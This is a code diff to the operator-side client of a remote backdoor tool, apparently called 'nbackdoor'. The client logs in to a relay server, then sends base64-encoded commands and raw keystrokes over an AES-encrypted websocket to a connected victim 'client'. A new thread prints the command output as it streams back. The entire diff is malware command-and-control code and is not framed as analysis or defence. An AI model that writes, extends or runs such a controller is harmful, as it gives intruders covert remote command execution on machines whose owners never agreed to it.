@@ -8,13 +8,12 @@ from colorama import Fore, Back, Style
 import uuid
 import json
 import time
-# from getpass import getpass
+from getpass import getpass
 from base64 import b64decode, b64encode
 import sys
 import msvcrt
 from websocket import create_connection
 from Crypto.Cipher import AES
-from _docpot import docopt
 __author__ = 'nekocode'
 
 
@@ -35,6 +34,7 @@ class ControllerClient:
         self.SECRET = os.urandom(32)
         self.ws = None
         self.to_client = None
+        self.is_cmd_running = False
 
         self.exit = False
         init(autoreset=True)
@@ -49,7 +49,7 @@ class ControllerClient:
                 # =====================
                 # ======= Login =======
                 # =====================
-                pwd = raw_input('Enter the password: ')
+                pwd = getpass('Enter the password: ')
 
                 try:
                     sercret_msg = {'uuid': self.UUID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET),
@@ -72,48 +72,36 @@ class ControllerClient:
                 # =======================
                 # ======= Command =======
                 # =======================
-                inputer = InputSender(self)
                 while not self.exit:
-                    inputer.stop = True
-
                     input_str = raw_input(Back.RED + 'nbackdoor' +
                                           ((' in ' + str(self.to_client) + '') if self.to_client is not None else '') +
                                           ':' + Back.RESET + ' ')
+
                     if input_str == 'exit':
                         self.exit = True
                         break
+                    elif input_str.strip() == '':
+                        continue
 
                     msg = json.dumps({'cmd': b64encode(input_str)})
                     self.ws.send_binary(self.encrypt(msg))
 
-                    inputer.stop = False
+                    self.is_cmd_running = True
+                    OutputReceiver(self)
 
-                    msg_recv = json.loads(self.decrypt(self.ws.recv()))
-                    if 'data' in msg_recv:
-                        while 'data' in msg_recv and 'end' not in msg_recv:
-                            data = get_data(msg_recv)
-                            print data
+                    while True:
+                        char = msvcrt.getwch()
+                        if not self.is_cmd_running:
+                            break
 
-                            msg_recv = json.loads(self.decrypt(self.ws.recv()))
-
-                    elif 'char' in msg_recv:
-                        while 'char' in msg_recv and 'end' not in msg_recv:
-                            char = get_char(msg_recv)
-                            sys.stdout.write(char)
-                            sys.stdout.flush()
-
-                            msg_recv = json.loads(self.decrypt(self.ws.recv()))
-
-                    elif 'connected' in msg_recv:
-                        self.to_client = msg_recv['connected']
-                        print 'Connected to client ' + str(self.to_client) + '.\n'
-                    elif 'disconnected' in msg_recv:
-                        if msg_recv['disconnected'] == 'offline':
-                            self.to_client = None
-                            print 'Client Offline.\n'
+                        if char == '\r':            # todo
+                            self.send_char('\r')
+                        elif char == '\x1b':        # Key Esc
+                            self.send_char('\x1b')
+                            while self.is_cmd_running:
+                                time.sleep(0.1)
                         else:
-                            self.to_client = None
-                            print 'Disconnected success.\n'
+                            self.send_char(char)
 
                 self.ws.close()
 
@@ -137,26 +125,50 @@ class ControllerClient:
     def send_char(self, char):
         self.ws.send_binary(self.encrypt(json.dumps({'char': b64encode(char)})))
 
+    def send_json(self, jsonobj):
+        self.ws.send_binary(self.encrypt(json.dumps(jsonobj)))
 
-class InputSender(threading.Thread):
+
+class OutputReceiver(threading.Thread):
     def __init__(self, client):
         threading.Thread.__init__(self)
 
         self.client = client
-        self.send_char = client.send_char
-        self.stop = True
+        self.ws = client.ws
+        self.decrypt = client.decrypt
 
-        self.exit = False
         self.daemon = True
         self.start()
 
     def run(self):
-        while not self.exit:
-            while self.stop:
-                time.sleep(0.1)
+        msg_recv = json.loads(self.decrypt(self.ws.recv()))
+        if 'data' in msg_recv:
+            while 'data' in msg_recv and 'end' not in msg_recv:
+                data = get_data(msg_recv)
+                print data
 
-            char = msvcrt.getch()       #todo !!!!!!!!!!!!!!!!!!!!!!!!!!!!
-            self.send_char(char)
+                msg_recv = json.loads(self.decrypt(self.ws.recv()))
+
+        elif 'char' in msg_recv:
+            while 'char' in msg_recv and 'end' not in msg_recv:
+                char = get_char(msg_recv)
+                sys.stdout.write(char)
+                sys.stdout.flush()
+
+                msg_recv = json.loads(self.decrypt(self.ws.recv()))
+
+        elif 'connected' in msg_recv:
+            self.client.to_client = msg_recv['connected']
+            print 'Connected to client ' + str(self.client.to_client) + '.\n'
+        elif 'disconnected' in msg_recv:
+            if msg_recv['disconnected'] == 'offline':
+                self.client.to_client = None
+                print 'Client Offline.\n'
+            else:
+                self.client.to_client = None
+                print 'Disconnected success.\n'
+
+        self.client.is_cmd_running = False
 
 
 def hostname():
